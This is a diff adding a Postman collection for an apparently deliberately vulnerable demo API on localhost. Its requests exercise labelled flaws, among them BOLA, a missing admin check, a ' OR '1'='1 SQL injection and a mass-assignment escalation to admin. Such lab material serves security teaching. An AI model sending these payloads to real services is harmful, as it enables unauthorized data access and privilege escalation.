@@ -1,0 +1,14 @@
+{
+  "info": { "name": "VulnerableAPI Demo Target", "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json" },
+  "item": [
+    { "name": "Login (no rate limit)", "request": { "method": "POST", "header": [{"key":"Content-Type","value":"application/json"}], "url": {"raw":"http://localhost:3001/api/auth/login","host":["localhost"],"port":"3001","path":["api","auth","login"]}, "body": {"mode":"raw","raw":"{\n  \"email\": \"alice@example.com\",\n  \"password\": \"password123\"\n}"} } },
+    { "name": "Get All Users (PII exposed)", "request": { "method": "GET", "url": {"raw":"http://localhost:3001/api/users","host":["localhost"],"port":"3001","path":["api","users"]} } },
+    { "name": "Get User 1 (BOLA)", "request": { "method": "GET", "url": {"raw":"http://localhost:3001/api/users/1","host":["localhost"],"port":"3001","path":["api","users","1"]} } },
+    { "name": "Get User 2 (BOLA exploit)", "request": { "method": "GET", "url": {"raw":"http://localhost:3001/api/users/2","host":["localhost"],"port":"3001","path":["api","users","2"]} } },
+    { "name": "Admin Users (NO AUTH!)", "request": { "method": "GET", "url": {"raw":"http://localhost:3001/api/admin/users","host":["localhost"],"port":"3001","path":["api","admin","users"]} } },
+    { "name": "Products Search (SQL Injection)", "request": { "method": "GET", "url": {"raw":"http://localhost:3001/api/products?q=iPhone","host":["localhost"],"port":"3001","path":["api","products"],"query":[{"key":"q","value":"iPhone"}]} } },
+    { "name": "SQL Injection Payload", "request": { "method": "GET", "url": {"raw":"http://localhost:3001/api/products?q=' OR '1'='1","host":["localhost"],"port":"3001","path":["api","products"],"query":[{"key":"q","value":"' OR '1'='1"}]} } },
+    { "name": "Mass Assignment (escalate to admin)", "request": { "method": "PUT", "header": [{"key":"Content-Type","value":"application/json"}], "url": {"raw":"http://localhost:3001/api/users/1","host":["localhost"],"port":"3001","path":["api","users","1"]}, "body": {"mode":"raw","raw":"{\n  \"name\": \"Hacked\",\n  \"email\": \"h@evil.com\",\n  \"role\": \"admin\",\n  \"balance\": 999999\n}"} } },
+    { "name": "API Info (JWT secret exposed!)", "request": { "method": "GET", "url": {"raw":"http://localhost:3001/api","host":["localhost"],"port":"3001","path":["api"]} } }
+  ]
+}
